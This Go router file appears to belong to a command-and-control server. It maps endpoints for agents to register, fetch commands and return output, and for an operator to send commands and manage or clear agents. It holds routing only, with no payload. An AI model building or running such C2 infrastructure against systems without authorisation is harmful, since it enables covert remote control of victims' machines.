package routers

import (
	"api/controllers"
	beego "github.com/beego/beego/v2/server/web"
)

func init() {

	beego.Router("/", &controllers.MainController{})
	beego.Router("/user/login", &controllers.APIController{}, "post:Login")
	
	// agent endpoints
	beego.Router("/agent/:id/register", &controllers.AgentController{}, "get:Register")
	// agent get command
	beego.Router("/agent/:id/plan", &controllers.AgentController{}, "get:GetCommand")
	// send output of command
	beego.Router("/agent/:id/result", &controllers.AgentController{}, "post:Result")


	// Database endpoints
	beego.Router("/db/agent", &controllers.APIController{}, "get:Agents")
	beego.Router("/db/agent/", &controllers.APIController{}, "get:Agents")
	beego.Router("/db/agent/create", &controllers.APIController{}, "get:CreateAgent")
	beego.Router("/db/clear", &controllers.APIController{}, "get:ClearAll")
	beego.Router("/db/delete", &controllers.APIController{}, "post:Del_Agent")

	// C2 endpoints
	beego.Router("/c2/command/send", &controllers.APIController{}, "post:RunCommand")
	// get command result

}